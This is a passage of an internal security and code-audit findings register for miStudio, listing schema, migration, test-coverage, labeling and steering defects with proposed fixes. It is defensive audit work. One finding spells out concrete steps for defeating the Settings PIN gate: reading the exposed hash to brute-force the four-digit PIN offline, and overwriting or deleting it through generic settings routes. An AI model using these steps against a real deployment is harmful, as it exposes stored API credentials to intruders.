- **Claim:** 0 of 23 objects in the circuit schema and 0 of 10 in the cluster schema set `additionalProperties: false`. For the absent ones pydantic's default `extra="ignore"` genuinely tightens them — verified. The real gap is the **two models declared `extra="allow"`**: a 100,000-character `evil_key` inside `meta` survives validation, and `from_definition` does `members=[m.model_dump() …]` into a JSONB column, so arbitrary attacker-controlled keys with unbounded values are **persisted and re-exported**.
- **Failure scenario:** A shared circuit-definition — the artifact this product is explicitly designed to exchange, including via a HuggingFace marketplace — carries an arbitrary payload through miStudio's database and back out to the next consumer. Not XSS in miStudio's own UI (no `dangerouslySetInnerHTML`, no `rehype-raw`, React escapes), so the risk is storage growth and propagation into a downstream renderer that is less careful.
- **Evidence:** verified-by-live-repro (reviewer round-tripped an oversized extra key)
- **Doc reference:** PADR IDL-30, IDL-33; the cluster MemberMeta contract is deliberately extensible
- **Verification (R3):** pending
- **Proposed remediation:** Keep `meta` extensible — that is a deliberate contract decision — but cap it: a `maxLength` on permitted extra values, or a total serialized-size limit on `meta`, enforced at import.
- **Effort:** S

---

### MIS-E2E-043 — The import path bypasses the length guards the create path has
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `docs/schemas/cluster-definition-v1.json` L48-59 (`display_token`, no `maxLength`); `DefinitionModelRef.hf_id` / `mistudio_model_id`; `ProfileMember.label`; `backend/src/api/v1/endpoints/circuits.py:195`
- **Claim:** The contract models put no `maxLength` on several strings that land in fixed-width columns — `cluster_profiles.display_token` is `String(255)`, `circuits.model_hf_id` is `String(500)`, `circuits.model_id` is `String(255)`. The **create** body guards this correctly (`circuits.py:43`, `model_hf_id: Field(None, max_length=500)`); the **import** path at `circuits.py:195` passes `defn.model.hf_id` raw.
- **Failure scenario:** An oversized value reaches Postgres and raises, so the user gets a 500 where a 422 was available and correct. Verified: 5,000,000-character `display_token` and `label` accepted by the contract models. The guard exists ten lines away on the sibling path — this is a single-site fix that was not generalized, the anti-pattern this repo has recorded before.
- **Evidence:** verified-by-live-repro (reviewer constructed oversized values and confirmed acceptance)
- **Doc reference:** PADR IDL-30, IDL-33
- **Verification (R3):** pending
- **Proposed remediation:** Put the `max_length` on the **contract models**, so both paths inherit it rather than one path remembering.
- **Effort:** S

---

### MIS-E2E-044 — The published schemas carry an internal domain as their canonical `$id`
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P3
- **Type:** security
- **Location:** `docs/schemas/circuit-definition-v1.json:1386`, `docs/schemas/cluster-definition-v1.json:638` — `$id: "https://mistudio.hitsai.net/schemas/…"`
- **Claim:** Both files declare an `$id` on the internal `hitsai.net` domain. These two files are **deliberately kept in the public mirror** (the `sync-to-clean` filter explicitly preserves `docs/schemas/`), so the internal domain ships publicly — and `$id` is precisely the field external validators attempt to **resolve**, so third-party tooling may generate outbound traffic to that host. Both `description` fields also name internal repo test paths (`backend/tests/unit/test_*_schema_sync.py`).
- **Failure scenario:** Low impact, high certainty. Discloses the internal domain and invites resolution attempts against it from anyone validating a miStudio document.
- **Evidence:** verified-by-live-repro (both lines read; the sync filter's preservation of `docs/schemas` confirmed at `sync-to-clean.yml:38-44`)
- **Doc reference:** memory `user-email-and-domains`; MIS-E2E-009 (same class, frontend)
- **Verification (R3):** pending — confirm against the public mirror's copy
- **Proposed remediation:** Use a public URL, or a URN that is not resolvable. Change it before the next mirror push.
- **Effort:** S

---

### MIS-E2E-045 — Two migrations overwrite system templates, discarding user edits, with a `pass` downgrade
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/alembic/versions/n1o2p3q4r5s6…:91-97`; `backend/alembic/versions/o2p3q4r5s6t7…:104-110`
- **Claim:** Both overwrite `system_message` and `user_prompt_template` matched on `name`, with **no `is_system` guard**. A user who edited a template that happens to share a name loses those edits at upgrade. `downgrade()` is `pass` in both. They do correctly use `bindparams`, so there is no injection.
- **Failure scenario:** Intentional seeding that is lossy for the user. Labeling prompt templates are user-authorable, and the match key is a name, not an ownership flag.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-21 (Context-Aware Labeling Template Strategy)
- **Verification (R3):** pending
- **Proposed remediation:** Guard on `is_system = true`.
- **Effort:** S

---

### MIS-E2E-046 — Deleting a training destroys user-curated feature data with no gate
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** debt
- **Location:** the CASCADE chain across `features`, `feature_activations`, `feature_analysis_cache`, `feature_dashboard_data`, `enhanced_labeling_jobs`, `feature_group_members`
- **Claim:** Migrations and ORM **agree** here — this is not a divergence, it is a design consequence. Deleting a training cascades to features, and features carry **user-curated** data: hand-edited labels, `notes`, `is_favorite`, and `star_color` — including the aqua state that PPRD §2.3 defines as *"completed, permanent, protected from bulk overwrite"*. One `DELETE /api/v1/trainings/{id}` destroys all of it, along with the two-pass LLM synthesis output. There is no soft delete, no export gate, and no confirmation of what will be lost.
- **Failure scenario:** Hours of curation vanish behind one unauthenticated DELETE. The product explicitly promises aqua stars are protected from bulk overwrite; nothing protects them from this.
- **Evidence:** verified-by-live-repro (FK delete rules read from both sides and confirmed to agree)
- **Doc reference:** PPRD §2.3 (star-colour state machine, "protected from bulk overwrite")
- **Verification (R3):** pending
- **Proposed remediation:** Report what would be destroyed before destroying it — a prune-preview, exactly as `GET /trainings/{id}/checkpoints/prune-preview` already does for checkpoints. That precedent exists in this codebase.
- **Effort:** M

---

### MIS-E2E-047 — Two template-seeding migrations build SQL by f-string with unescaped numerics
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/alembic/versions/90faea1e38d0…:63-75`, `backend/alembic/versions/9dc725cba2ad…:58-70`
- **Claim:** Both build SQL by f-string from a JSON file on disk. String fields pass through a hand-rolled `escape_sql` that only doubles single quotes; `temperature`, `max_tokens` and `max_examples` are interpolated with **no escaping at all**. The source is a repo-controlled file (`src/data/templates/anthropic_style.json`), so it is **not remotely exploitable** — recorded as the one genuine string-built-SQL pattern in a tree that is otherwise entirely parameterized.
- **Failure scenario:** None today. It becomes a real vector the moment anyone makes the template source user-supplied, and a hand-rolled `escape_sql` reads as a sanctioned pattern to the next author.
- **Evidence:** verified-by-live-repro (read; source traced to a repo file)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Use `bindparams`, as every other data-bearing migration in the tree already does.
- **Effort:** S

---

### MIS-E2E-048 — A schema-audit script reports "all models match the database" while checking only column names
- **Phase / Round:** P01 / R1
- **Source:** /review
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/check_migrations.py:18-64`, and its final message
- **Claim:** The script compares `information_schema.columns` against `table.columns` — **column names only**. It never queries `pg_constraint`, never inspects foreign keys, unique constraints or indexes. It then prints:
  ```
  ================================================================================
  ✅ No migration gaps found! All models match the database schema.
  ================================================================================
  ```
  It printed exactly that during this audit, on a database where **five constraint divergences are provably present** — the three missing foreign keys of MIS-E2E-033 and the two ORM-absent unique constraints of MIS-E2E-031.
- **Failure scenario:** This is the fail-open shape, in the tool built to detect drift. Its conclusion ("all models match the database schema") is far broader than its method ("the column names are the same"), so anyone who runs it — the sibling `audit_migrations.py` explicitly recommends it as *"the authoritative check"* — is told the schema is correct when it is not. A guard whose claim exceeds its check is worse than no guard.
- **Evidence:** verified-by-live-repro — script executed against `mistudio-postgres`; green output captured; the same database queried directly for `pg_constraint` and found divergent
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Either narrow the claim to what it checks ("column names match"), or extend it to constraints and indexes. Then wire it into CI — an unrun check cannot drift-detect anything. Note the same rule fixes MIS-E2E-031/033: a `Base.metadata` vs live-schema diff covering constraints would catch all five at once.
- **Effort:** M

---

### MIS-E2E-049 — A sibling audit script contradicts it, via a regex that truncates every `create_table`
- **Phase / Round:** P01 / R1
- **Source:** /review
- **Severity:** P3
- **Type:** bug
- **Location:** `backend/find_column_gaps.py:38` — `re.finditer(r'op\.create_table\s*\(\s*["\'](\w+)["\']([^)]+\))+', content, re.DOTALL)`
- **Claim:** The two unowned scripts give opposite answers about the same schema. `check_migrations.py` says no gaps; `find_column_gaps.py` reports eleven `trainings` columns as *"not found in migrations"* — `celery_task_id`, `checkpoint_dir`, `completed_at`, `started_at`, `logs_path`, the four `current_*` live stats, and both error columns. **All eleven exist**, both in the database and in `5523f486e7f0_create_training_tables.py`. The cause is the `[^)]+` in the capture group: it stops at the **first** `)`, which is the end of the first `sa.Column(...)` call, so only the opening column or two of any `create_table` block is ever scanned. Columns added later by `op.add_column` are matched fine — which is why the false positives cluster on tables created whole.
- **Failure scenario:** The script cries wolf on every large `create_table`, which is why nobody runs it, which is why its sibling's fail-open green (MIS-E2E-048) is the one that gets believed. Recorded as its own finding because the two scripts *disagreeing* is the observable symptom, and a maintainer comparing them would reasonably conclude the green one is right.
- **Evidence:** verified-by-live-repro — both scripts executed; `celery_task_id` confirmed present in the DB and at `5523f486e7f0_create_training_tables.py:53`; the regex mechanism read
- **Doc reference:** PADR IDL-16
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Delete it, or rewrite it against the alembic API rather than against source text. This is the third source-scrape guard in this codebase's history to fail on an unexpected layout; the standing lesson says read the registry, not the source.
- **Effort:** S
- **Related:** MIS-E2E-022 (the four scripts are unowned), MIS-E2E-048

---

### MIS-E2E-050 — The documented data model omits 11 of 38 tables, including one its own diagram draws
- **Phase / Round:** P01 / R1
- **Source:** /review
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `manual/docs/reference/data-model.md` (115 lines, last touched 2026-07-26)
- **Claim:** The page documents 17 tables across "Pipeline", "Feature", "Circuit & cluster" and "Job & support" sections. The database has 38. Eleven are never described anywhere on the page: `checkpoints`, `feature_groups`, `feature_group_members`, `feature_grouping_runs`, `feature_token_index`, `feature_analysis_cache`, `feature_dashboard_data`, `agent_approval_requests`, `dismissed_operations`, `alembic_version`, `feature_activations_default`.
- **Failure scenario:** Three of these matter. (1) **`checkpoints` is drawn in the page's own Mermaid ER diagram** at line 18 (`trainings ||--o{ checkpoints`) and then has no section and no table row — a reader who follows the diagram to look it up finds nothing, on the page that *does* document `trainings.finalized_from_step` and links to the checkpoint-lifecycle guide. (2) The **entire Clusters subsystem** is undocumented — `feature_groups`, `feature_group_members`, `feature_grouping_runs`, `feature_token_index` back three shipped features (PPRD rows 13–15) and the whole Feature Groups panel. (3) **`agent_approval_requests`** is the MCP approval gate — the table behind the mechanism that decides whether an agent's destructive action needs a human, absent from the data-model reference.
- **Evidence:** verified-by-live-repro — live `pg_tables` list diffed against every backticked identifier on the page
- **Doc reference:** self; PADR IDL-26 (MCP approvals), IDL-28/29/30 (clusters)
- **Verification (R3):** pending
- **Proposed remediation:** Add the missing tables. Then add a doc test that diffs `Base.metadata.tables` against the identifiers the page mentions — the same derive-from-the-registry rule as MIS-E2E-048, applied to documentation.
- **Effort:** M

---

## P01 — R2 (adversarial re-review + mutation controls)

---

### MIS-E2E-051 — The startup schema validator has zero tests and its result is discarded
- **Phase / Round:** P01 / R2
- **Source:** mutation control M2
- **Severity:** P2
- **Type:** test-gap
- **Location:** `backend/src/db/schema_validator.py` (whole module); `backend/src/main.py:42-54`
- **Claim:** Removing `"models"` from `REQUIRED_TABLES` left **155 tests green**. Investigating why: **no test file anywhere references `schema_validator`, `REQUIRED_TABLES` or `validate_schema`** — the module is entirely untested. It has exactly one production caller, `main.py:45`, and `main.py:46-51` uses the boolean only to emit `logger.warning`; the surrounding `except` at `:52` continues startup on any error, commented *"Continue startup even if validation fails to avoid blocking deployment."*
- **Failure scenario:** The mechanism is non-blocking **by design** — `validate_schema_on_startup`'s docstring calls it *"a softer check that logs warnings but doesn't crash the application"*, which is a defensible choice. The finding is the combination: a check that covers 15 of 36 tables (MIS-E2E-032), reports success on a broken database, is never exercised by a test, and whose result nothing acts on. Each property alone is arguable; together they mean the schema validation subsystem provides no assurance whatsoever, while its startup log line says it does.
- **Evidence:** **verified-by-mutation** — M2 landed (`git diff --stat` confirmed 1 deletion), suite green, restore verified clean. Plus a grep proving zero test references.
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Test it, or delete it. If it stays: derive `REQUIRED_TABLES` from `Base.metadata` (MIS-E2E-032), add a test that fails when the list shrinks, and decide deliberately whether a missing table should block startup.
- **Effort:** M

---

### MIS-E2E-052 — Any field can be dropped on circuit import and the suite stays green
- **Phase / Round:** P01 / R2
- **Source:** mutation control M3
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/api/v1/endpoints/circuits.py:190-205` (the import dict); no round-trip test exists
- **Claim:** Deleting `"faithfulness"` from the dict the import endpoint passes to `CircuitService.create` — the **exact shape** of the real calibration bug in MIS-E2E-037 — left every circuit test green.
- **Failure scenario:** This is the systemic cause behind MIS-E2E-037, and it reframes that finding. Calibration is not missing because someone made a one-off typo; it is missing because **the import path has no round-trip protection of any kind**, so the field simply never had to be there. Confirmed at source: `CircuitService.create` reads `data.get("calibration")` (`circuit_service.py:224`) and the endpoint's dict has no such key, while every other contract field — `saes`, `members`, `edges`, `budget`, `faithfulness`, `discovery` — is passed. The service is fully wired to carry calibration; only the caller omits it. The next field added to the contract will be dropped the same way, silently.
- **Evidence:** **verified-by-mutation** — M3 landed (2 lines deleted, confirmed), `tests/unit -k circuit` green, restore verified clean
- **Doc reference:** PADR IDL-33 clause 6 (round-trip discipline); BR-013 round-trip
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** One test: build a maximal `CircuitDefinitionV1` with every optional block populated, import it, export it, assert **document equality**. That single test fails for calibration today and would have failed for any of the other five. Field-by-field assertions are the weaker form — they only cover the fields someone remembered.
- **Effort:** S
- **Related:** MIS-E2E-037 (the instance), this (the cause)

---

### MIS-E2E-053 — No test exercises any delete cascade
- **Phase / Round:** P01 / R2
- **Source:** mutation control M5
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/models/feature.py` (3 `ondelete="CASCADE"` declarations); the suite generally
- **Claim:** Flipping **all three** CASCADE declarations on the `Feature` model to RESTRICT left **211 tests green**. Nothing anywhere asserts that deleting a parent removes its children, or that it is refused when it should be.
- **Failure scenario:** This explains MIS-E2E-033. Three foreign keys are declared on ORM models and absent from the production database; the suite could not possibly have caught that, because it never exercises a cascade — and it builds its own test schema from those same ORM declarations, so the constraints it does not test are also the only ones it has. It equally explains why MIS-E2E-046 (a training delete destroying curated labels, notes and aqua stars) has no protective test: the destructive path is unexercised in both directions. Deletion is the one operation in this product that cannot be undone, and it is the one with no coverage.
- **Evidence:** **verified-by-mutation** — M5 landed (3 replacements, `git diff --stat` confirmed), suite green, restore verified clean
- **Doc reference:** PADR IDL-16; PPRD §2.3 (aqua stars "protected from bulk overwrite")
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Integration tests against a **migrated** database, not a `create_all` one — insert a parent and children, delete the parent, assert what survives. Running them against the migrated schema is the point: it is the only way a test can see the divergence in MIS-E2E-033.
- **Effort:** M

---

### MIS-E2E-054 — `datetime.utcnow()` is deprecated and used at 37 sites
- **Phase / Round:** P01 / R2
- **Source:** adversarial re-review of R1's datetime judgement
- **Severity:** P3
- **Type:** debt
- **Location:** 37 call sites across 13 files in `backend/src/`, including the `default=` and `onupdate=` of the naive `created_at`/`updated_at` columns on `circuits`, `cluster_profiles`, `validation_manifests`, `circuit_capture_runs` and `steering_record_runs`
- **Claim:** The backend runs Python 3.12.3, where `datetime.datetime.utcnow()` is deprecated and scheduled for removal. The test suite already emits the warning. Every naive timestamp column in the circuits/clusters/manifests family is defaulted by it.
- **Failure scenario:** No behaviour change today — `utcnow()` returns naive UTC, which is exactly what these `timestamp without time zone` columns want. The risk is the migration: the obvious replacement `datetime.now(datetime.UTC)` returns an **aware** datetime, and asyncpg raises a `DataError` on an aware value bound to a `timestamp without time zone` column — a failure this codebase has already live-reproduced as a 500 (the comment at `circuit_service.py:246-247` records it). So the mechanical fix breaks these five tables, and the safe replacement is `datetime.now(timezone.utc).replace(tzinfo=None)`.
- **Evidence:** verified-by-live-repro — 37 sites counted; `python -V` = 3.12.3; DeprecationWarnings observed in the baseline run
- **Doc reference:** none
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** One helper (`utc_naive()`), applied at all 37 sites, so the correct form is written once. Do not do this as a find-and-replace to `datetime.now(UTC)`.
- **Effort:** M

---

## P02 — Backend services

---

### MIS-E2E-055 — The Settings PIN can be read, rewritten and deleted through the settings routes it guards
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/settings.py:100` (`is_sensitive=False`), `:138` (`PUT /settings`, no key guard), `:195` (`DELETE /settings/{key}`), `:36` (`_PIN_HASH_KEY = "settings_pin_hash"`)
- **Claim:** The PIN is stored as an ordinary settings row under a known key, and the generic settings routes have no allowlist. Three independent bypasses of the same gate:
  1. **Read it.** `_hash_pin` output is written with `is_sensitive=False`. Masking in `list_settings`/`get_setting` is conditional on `is_sensitive`, so `GET /settings/settings_pin_hash` — or just `GET /settings?category=system` — returns the **PBKDF2 salt and hash in the clear**. The PIN space is four digits: 10,000 candidates, offline, instant.
  2. **Rewrite it.** `PUT /settings` validates only that `data.key in _URL_VALIDATED_KEYS` (two URL keys) and otherwise upserts anything. `PUT {"key":"settings_pin_hash","value":"<hash of a PIN I choose>"}` replaces the PIN, bypassing the `current_pin` check that `/pin/set` performs at `:91-93`.
  3. **Delete it.** `DELETE /settings/settings_pin_hash` removes the row; `/pin/set` then reads `existing = None` at `:88` and its `if existing and not settings.bypass_settings_pin` guard is skipped, so a new PIN can be set with no current PIN at all.
- **Failure scenario:** This is **not** covered by the accepted no-app-auth posture (MIS-E2E-002). The PIN's entire threat model is to gate the Settings panel — where the OpenAI and HuggingFace credentials live — from someone who *already has network access*. That is precisely the population the nginx/LAN boundary admits. The gate is defeated by three of the routes sitting beside it, and route (1) needs no write at all.
- **Evidence:** **verified-by-live-repro at source** — all four line ranges read and quoted; the masking condition, the absent allowlist and the `existing is None` path each confirmed
- **Doc reference:** PADR IDL-25 (Settings Panel PIN Protection), IDL-20
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Store the PIN outside the generic settings table, or deny `settings_pin_hash` (and any future gate key) in `PUT`, `PUT /bulk`, `DELETE` and the two `GET`s. Marking it `is_sensitive=True` fixes only bypass (1). The general lesson: a gate must not be stored in the thing it gates.
- **Effort:** M
- **Supersedes in part:** MIS-E2E-005 — that finding said the PIN protects nothing it appears to protect; this is the mechanism, and it is worse than "not enforced".

---

### MIS-E2E-056 — After a key change, ciphertext is sent to OpenAI as a bearer token
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/core/encryption.py:97` (the fail-open return); consumer `OpenAILabelingService`
- **Claim:** `decrypt_value` swallows `InvalidTag` and returns the stored value unchanged (MIS-E2E-004). This finding is the **consequence**, which MIS-E2E-004 did not trace: if `SETTINGS_ENCRYPTION_KEY` or `secret_key` changes — a rotation, a redeploy with a regenerated secret, a different environment — every stored API key fails authentication and is returned as **raw base64 ciphertext**, which is then handed to `OpenAILabelingService` and transmitted to `api.openai.com` in an `Authorization: Bearer` header.
- **Failure scenario:** Encrypted credential material leaves the network boundary and reaches a third party in a request header, because the decryption failure was designed to be invisible. The user sees an authentication error from OpenAI and reasonably concludes the key is wrong — the actual event is that their ciphertext was just transmitted. No log line distinguishes this from a genuinely bad key.
- **Evidence:** plausible (read-only) — the fail-open path is verified; the transmission is traced through the consumer, not executed
- **Doc reference:** PADR IDL-20, IDL-19 (OpenAI SDK as standard client)
- **Verification (R3):** pending — trace the exact header construction
- **Proposed remediation:** Raise on `InvalidTag`. This is the third finding rooting in the same swallow (MIS-E2E-004 integrity, MIS-E2E-041 permanent plaintext, this) — fix once.
- **Effort:** S
- **Related:** MIS-E2E-004, MIS-E2E-041

---

### MIS-E2E-057 — Cancelling a labeling job can never be observed
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:610` (`_raise_if_cancelled`)
- **Claim:** `_raise_if_cancelled` re-queries `LabelingJob` on a session configured `expire_on_commit=False`. SQLAlchemy returns the **identity-mapped object already in the session**, not fresh database state, so a status written by another connection is never seen. The reviewer verified this empirically on SQLAlchemy 2.0.45.
- **Failure scenario:** The user presses Cancel; the API writes `CANCELLED`; the running job never observes it, labels every remaining feature, and on completion writes `COMPLETED` **over** the cancel. That is the exact production symptom the cancel feature was built to fix. **Why no test catches it:** the existing test's fake `_Session` returns a fresh row on every call — it has no identity map, so the fixture cannot exhibit the behaviour under test. Fixtures agreeing by construction, again.
- **Evidence:** verified-by-live-repro (reviewer executed against SQLAlchemy 2.0.45)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** `await db.refresh(job)` or `session.expire(job)` before the read, or query with `populate_existing()`. The test needs a real session, not a fake without an identity map.
- **Effort:** S

---

### MIS-E2E-058 — A cancelled labeling job is reported as failed
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:1483`; `backend/src/workers/labeling_tasks.py:92`
- **Claim:** `_LabelingCancelled` is caught by the outer `except Exception`, which sets `status=FAILED` and emits `labeling:failed` before re-raising. `labeling_tasks.py:92` carries a comment asserting *"the job row is already CANCELLED"* — it is not; it was just overwritten to FAILED.
- **Failure scenario:** A deliberate user cancellation surfaces in the UI as a failure, and the comment documenting the opposite means the next reader will not look. (Only reachable once MIS-E2E-057 is fixed — today the cancellation is never raised at all.)
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Catch `_LabelingCancelled` before the generic handler.
- **Effort:** S

---

### MIS-E2E-059 — The documented no-template fallback path raises `UnboundLocalError`
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:906`, `:1056`, `:1255`; binding site inside `if template:`
- **Claim:** `job_batch_size` is assigned only inside the `if template:` branch and read unconditionally at three later points. The "no template found" path is explicitly supported, and it dies with `UnboundLocalError`.
- **Failure scenario:** A labeling run started against a deleted or missing template crashes with a Python error rather than falling back, at three separate sites. The crash surfaces as a generic 500 / FAILED job.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Bind the default before the branch.
- **Effort:** S

---

### MIS-E2E-060 — Per-job `max_tokens` is silently overwritten by the template's
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/services/labeling_service.py:1046`
- **Claim:** `max_tokens` is exposed on the API and in the UI as a per-job setting, and is then unconditionally replaced by `template.max_tokens` (default **50**). The sibling `max_examples` gets the precedence right; `max_tokens` does not.
- **Failure scenario:** A user raises `max_tokens` to get longer feature descriptions, the value is accepted, and every description is still truncated at the template default. The control appears to work and does nothing — and this is the same class as the J-Lens arc's "a remedy string naming a control that does not do what it says".
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-18 (enhanced labeling)
- **Verification (R3):** pending
- **Proposed remediation:** Mirror the `max_examples` precedence: job value wins, template is the default.
- **Effort:** S

---

### MIS-E2E-061 — Three smaller defects in the labeling and encryption paths
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P3
- **Type:** bug
- **Location:** `labeling_service.py:1202` and `:1407`; `labeling_service.py:720`; `core/encryption.py:126`
- **Claim:** Three independent minor defects, grouped because each is a one-line fix:
  1. **`finally` masks the real error.** Both `finally` blocks dereference `labeling_service`, which is unbound if the `OpenAILabelingService` constructor raises — so a construction failure surfaces as `UnboundLocalError` and the actual cause is lost.
  2. **Explicit null batch size crashes.** `"batch_size": null` in a request survives `.get(key, default)` as `None` (the default only applies to a *missing* key) and reaches `range(0, n, None)` → `TypeError`.
  3. **`mask_value` reveals short secrets.** For a 4–7 character value it emits every character — `"abcd"` masks to `"abc...abcd"`. The docstring's own example is also wrong.
- **Failure scenario:** (3) is the one with security relevance, though bounded: any secret short enough to be fully revealed by the mask is short enough to be low-value. Recorded because `mask_value` is the function the UI trusts to not show a credential.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Bind before `try`; treat `None` as absent; make `mask_value` reveal a fixed suffix only above a minimum length, and fix the docstring.
- **Effort:** S

---

### MIS-E2E-062 — The entire steering resilience layer is unreachable; `/steering/status` is always "healthy"
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** **P0** *(per this audit's rubric: "a capability the product claims to ship that is unreachable in production")*
- **Type:** reachability
- **Location:** `backend/src/services/steering_resilience.py` (508 lines — circuit breaker, concurrency limiter, process isolation); consumers `backend/src/api/v1/endpoints/steering.py:158` (`GET /steering/status`) and `:193` (`POST /steering/reset`)
- **Claim:** The module implements a circuit breaker with failure thresholds and CLOSED/OPEN/HALF_OPEN states, a concurrency limiter, and process isolation. **Not one of its state-mutating functions has a caller.** Verified by grepping `backend/src` *and* `backend/tests`:
  ```
  can_execute              callers outside the module: 0
  try_acquire              callers outside the module: 0
  record_success           callers outside the module: 0
  record_failure           callers outside the module: 3  ← all false positives
  execute_with_isolation   callers outside the module: 0
  ```
  The three `record_failure` hits are an **unrelated method of the same name** on `EdgeEvidence` in `schemas/evidence_ladder.py:71` and its two tests. A name collision, not a caller. The endpoint imports only the *getters*: `get_circuit_breaker`, `get_concurrency_limiter`, `get_process_isolation`, `get_resilience_status`, `reset_resilience`.
- **Failure scenario:** `_failure_count` is initialised to 0 at `:76` and incremented only in `record_failure`, which nothing calls. `_state` is initialised CLOSED at `:75` and leaves CLOSED only inside the same dead function. Therefore `GET /steering/status` computes `"healthy" if resilience["circuit_breaker"]["state"] == "closed"` and **can only ever return "healthy"** — no matter how many steering tasks have failed. `POST /steering/reset` resets state that was never non-default: a no-op that reports success. The endpoint's own docstring says *"Use this endpoint to monitor steering health and diagnose issues."* An operator diagnosing a steering outage is told the service is healthy, by design, always.
- **Evidence:** **verified-by-live-repro** — caller grep over `src` and `tests`, the three hits individually resolved to a name collision, the state-transition sites read
- **Doc reference:** none — and that is part of the finding; `CLAUDE.md`'s Reachability gate says *"A capability is not shipped until a test FAILS when its wiring is removed."* Nothing here can be unwired, because nothing is wired.
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Either wire it — `record_failure` on the steering task's exception path, `try_acquire` around dispatch — or delete the module and make `/steering/status` report what it can actually observe. Shipping a health endpoint that is a constant is worse than not shipping one. Then apply the repo's own rule: delete the wiring line and require a red.
- **Effort:** M
- **Note:** This is the same shape as the 16 unregistered `millm_circuit_*` MCP tools that `backend/tests/unit/test_reachability.py` was written to prevent. That harness guards the MCP surface only; nothing guards the service layer.

---

### MIS-E2E-063 — Coherence and behavioral scores are a hardcoded 0.5 presented as measurements
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug *(the "wrong results presented as correct" class)*
- **Location:** `backend/src/services/steering_service.py:1568-1573`; `backend/requirements.txt`
- **Claim:** `_compute_coherence` lazily imports `sentence_transformers`, and on `ImportError` logs a warning and `return 0.5`. **`sentence-transformers` is not in `requirements.txt` or `pyproject.toml`, and is not installed in the backend venv** — confirmed: `ModuleNotFoundError: No module named 'sentence_transformers'`. So the import always fails, and every `coherence` and `behavioral_score` the product has ever reported is the literal constant `0.5`.
- **Failure scenario:** The UI renders these as measured quality scores beside real generated text. A user comparing steering strengths sees coherence 0.5 at every dial and reads it as "coherence is unaffected by strength" — a finding about the model, produced by a missing dependency. This is precisely the class the J-Lens arc's review lessons name: *evidence that is wrong rather than merely missing*. Second-order: the `except` clause catches only `ImportError`, so a non-import failure (the model's first-use download failing offline — the normal case in this deployment) propagates and aborts the whole steering request instead of degrading.
- **Evidence:** **verified-by-live-repro** — dependency files grepped, import attempted in the real venv and failed
- **Doc reference:** PPRD §3.6 (Model Steering quality metrics)
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Add the dependency, or return `None` and have the UI render "not measured". A constant must never occupy a field the user reads as a measurement. Broaden the `except` to `Exception` either way.
- **Effort:** S

---

### MIS-E2E-064 — Compare and sweep steer with the wrong SAE basis; the 015 hazard was fixed on one path
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/steering_service.py:1888` (compare/sweep), `:2402` (`sae_map[request.sae_id]`)
- **Claim:** Compare and sweep place their hook at `feature.layer` but always steer using the **request-level** SAE, discarding each feature's own `sae_id`. No endpoint validates that `feature.layer == sae.layer`. Because `d_model` is uniform across layers, the `hidden_dim != sae.d_in` shape guard **never fires** — so a feature from layer 20's dictionary is decoded through layer 12's SAE and applied at layer 20, silently, in the correct shape and the wrong basis. This is the Feature 015 multi-SAE hazard, and it was fixed for the **combined** path only.
- **Failure scenario:** Steering output that looks plausible and is meaningless — the worst failure mode for an interpretability tool, because there is no error and the number of dimensions is right. Separately at `:2402`, `sae = sae_map[request.sae_id]` raises a bare `KeyError` inside the Celery worker when no feature routes to the request-level SAE — a multi-layer circuit whose primary SAE's layer carries no steerable members, or whose members fell past the 20-feature cap.
- **Evidence:** plausible (read-only) — the code path is verified; the wrong-basis consequence is reasoned from uniform `d_model`
- **Doc reference:** PADR IDL-31 (multi-SAE cross-layer steering, per-layer SAE application); 015_FPRD
